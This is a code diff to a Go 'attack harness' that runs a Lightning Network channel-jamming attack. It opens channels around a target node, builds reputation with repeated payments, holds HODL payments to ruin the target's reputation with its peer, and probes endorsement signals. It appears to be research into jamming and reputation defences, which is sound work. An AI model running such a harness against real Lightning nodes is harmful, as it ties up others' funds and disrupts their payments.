@@ -3,13 +3,13 @@ package main
 import (
 	"context"
 	"fmt"
+	"github.com/lightningnetwork/lnd/funding"
 	"math"
 	"os"
 	"sync"
 	"sync/atomic"
 	"time"
 
-	"github.com/btcsuite/btcd/btcutil"
 	"github.com/lightninglabs/lndclient"
 	"github.com/lightningnetwork/lnd/routing/route"
 	"github.com/lightningnetwork/lnd/signal"
@@ -75,42 +75,6 @@ func main() {
 	if err != nil {
 		fmt.Printf("Could do things: %v\n", err)
 	}
-	/*
-		// TODO: should be able to do this at the same time by sending
-		// back and forth.
-
-		// Build good rep for attacker 0 chan.
-		err = ah.buildRep(ctx, 0)
-		if err != nil {
-			fmt.Printf("Could not build rep for a0: %v\n", err)
-			os.Exit(1)
-		}
-
-		// Build good rep for attacker 2 chan.
-		err = ah.buildRep(ctx, 2)
-		if err != nil {
-			fmt.Printf("Could not build rep for a2: %v\n", err)
-			os.Exit(1)
-		}
-	*/
-
-	// Now, create HODL payment from A0->A1. We want to see this degrade the
-	// rep between target and its peer.
-
-	// While we hold this payment, we will keep sending small payments from
-	// our good node, A2 to A1 and observe the endorsed signal that arrives
-	// at A1. If this switches to unendorsed, then we know that the rep of
-	// target node is bad as seen by peer node (since there is no reason that
-	// the target node would change the rep of our good node, A2).
-	/*
-		err = ah.hodlAndAssess(ctx)
-		if err != nil {
-			fmt.Printf("Could not hodl and asses: %v\n", err)
-			os.Exit(1)
-		}
-
-	*/
-
 	/*
 		err = ah.jam(ctx)
 		if err != nil {
@@ -189,6 +153,7 @@ func newAttackHarness(ctx context.Context, target route.Vertex,
 }
 
 func (h *attackHarness) doThings(ctx context.Context) error {
+	fmt.Println("Opening channels...")
 
 	if err := h.openChans(ctx); err != nil {
 		return err
@@ -200,13 +165,23 @@ func (h *attackHarness) doThings(ctx context.Context) error {
 		return err
 	}
 
-	fmt.Println("Our channels have good reputation!")
+	fmt.Println("Our channels now have good reputation!")
 
-	if err := h.sendPaymentsSlowly(ctx); err != nil {
+	/*
+		if err := h.hodlAndAssess(ctx); err != nil {
+			return err
+		}
+
+	*/
+
+	if err := h.jam(ctx); err != nil {
 		return err
 	}
 
-	// Send payments every few seconds.
+	// Send payments every few seconds forever.
+	if err := h.sendPaymentsSlowly(ctx); err != nil {
+		return err
+	}
 
 	return nil
 }
@@ -215,12 +190,10 @@ func (h *attackHarness) stop(ctx context.Context) {
 	fmt.Println("attack harness stopping...")
 	defer fmt.Println("attack harness stopped")
 
-	/*
-		err := h.closeAllChans(ctx)
-		if err != nil {
-			fmt.Printf("could not close channels...: %v\n", err)
-		}
-	*/
+	err := h.closeAllChans(ctx)
+	if err != nil {
+		fmt.Printf("could not close channels...: %v\n", err)
+	}
 
 	close(h.quit)
 	h.wg.Wait()
@@ -244,7 +217,7 @@ func (h *attackHarness) closeAllChans(ctx context.Context) error {
 }
 
 func (h *attackHarness) openChans(ctx context.Context) error {
-	chanCap := btcutil.Amount(16777215)
+	chanCap := funding.MaxBtcFundingAmount
 	_, err := h.graph.OpenChannel(ctx, OpenChannelReq{
 		Source:      0,
 		Dest:        h.targetNode.PubKey,
@@ -255,7 +228,8 @@ func (h *attackHarness) openChans(ctx context.Context) error {
 		return err
 	}
 
-	fmt.Printf("opened channel with target node (%s) from a0\n", h.targetNode.Alias)
+	fmt.Printf("opened channel with target node (%s) from a0\n",
+		h.targetNode.Alias)
 
 	// With attack node 1, open a channel with the targets peer & push a
 	// large amount to them.
@@ -268,11 +242,12 @@ func (h *attackHarness) openChans(ctx context.Context) error {
 	if err != nil {
 		return err
 	}
-	fmt.Printf("opened channel with target peer (%s) from a1\n", h.targetPeerNode.Alias)
+	fmt.Printf("opened channel with target peer (%s) from a1\n",
+		h.targetPeerNode.Alias)
 
-	// Open chan from a2 to target (a2 is our "good" node). We will build good rep
-	// for it and maintain that good rep. If its payments stop going through then
-	// we know we have jammed the target channel.
+	// Open chan from a2 to target (a2 is our "good" node). We will build
+	// good rep for it and maintain that good rep. If its payments stop
+	// going through then we know we have jammed the target channel.
 	_, err = h.graph.OpenChannel(ctx, OpenChannelReq{
 		Source:      2,
 		Dest:        h.targetNode.PubKey,
@@ -289,6 +264,8 @@ func (h *attackHarness) openChans(ctx context.Context) error {
 	return nil
 }
 
+// buildReputation sends payments back and forth between A0 & A2 until the two
+// channels that A0 & A2 have with the attacker have good reputation.
 func (h *attackHarness) buildReputation(ctx context.Context) error {
 	// Get current best block
 	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
@@ -362,6 +339,8 @@ func (h *attackHarness) buildReputation(ctx context.Context) error {
 	return nil
 }
 
+// sendPaymentsSlowly alternates between sending payments from A0->A1 and
+// A0->A2. It is used to show if they arrive with the endorsement signal or not.
 func (h *attackHarness) sendPaymentsSlowly(ctx context.Context) error {
 	// Get current best block
 	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
@@ -430,7 +409,7 @@ func (h *attackHarness) sendGoodAndCheckEndorsed(ctx context.Context, src,
 }
 
 func (h *attackHarness) hodlAndAssess(ctx context.Context) error {
-	// Get current best block
+	// Get current best block.
 	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
 	if err != nil {
 		return err
@@ -440,7 +419,7 @@ func (h *attackHarness) hodlAndAssess(ctx context.Context) error {
 
 	// We do endorse this cause we want the target node to endorse
 	// it so that its reputation with its peer gets destroyed.
-	fmt.Println("Start jam payment from A0 -> A1")
+	fmt.Println("Start creating HODL payment from A0 -> A1")
 	jamResp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
 		AmtMsat:         800000,
 		SourceIdx:       0,
@@ -468,30 +447,15 @@ func (h *attackHarness) hodlAndAssess(ctx context.Context) error {
 			source = 0
 		}
 
-		resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
-			AmtMsat:         1000,
-			SourceIdx:       source,
-			DestIdx:         1,
-			FinalCLTV:       uint64(height) + 80,
-			EndorseOutgoing: true,
-			Settle:          true,
-		})
+		_, err := h.sendGoodAndCheckEndorsed(ctx, source, 1, height)
 		if err != nil {
 			return err
 		}
 
-		r := <-resp
-		if r.Err != nil {
-			return err
-		}
-
-		fmt.Printf("results from A%d -> A1: %v\n", source, outgoingEndorsed(r.Htlcs))
-
 		select {
 		case <-interceptor.ShutdownChannel():
 			break
-		default:
-			continue
+		case <-time.Tick(time.Millisecond * 50):
 		}
 
 		break
@@ -568,34 +532,13 @@ func (h *attackHarness) jam(ctx context.Context) error {
 
 	r := <-resp
 	if r.Err != nil {
-		fmt.Printf("Good payment failed!! %v\n", err)
+		fmt.Printf("Good payment failed!! %v\n", r.Err)
 		return err
 	}
-
-	fmt.Printf("results from A2 -> A1: %v\n", outgoingEndorsed(r.Htlcs))
+	fmt.Printf("good succeeded! was it endorsed? %v\n", outgoingEndorsed(r.Htlcs))
 
 	return nil
 }
-
-/*
-func (h *attackHarness) quickSends(ctx context.Context) error {
-	// Get current best block
-	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
-	if err != nil {
-		return err
-	}
-
-	_, _, err = h.Lnd1.Client.AddInvoice(ctx, &invoicesrpc.AddInvoiceData{
-		Value:           0,
-		DescriptionHash: nil,
-		CltvExpiry:      80,
-	})
-	if err != nil {
-
-	}
-
-}
-*/
 
 func outgoingEndorsed(htlcs []lndclient.InvoiceHtlc) bool {
 	for _, htlc := range htlcs {
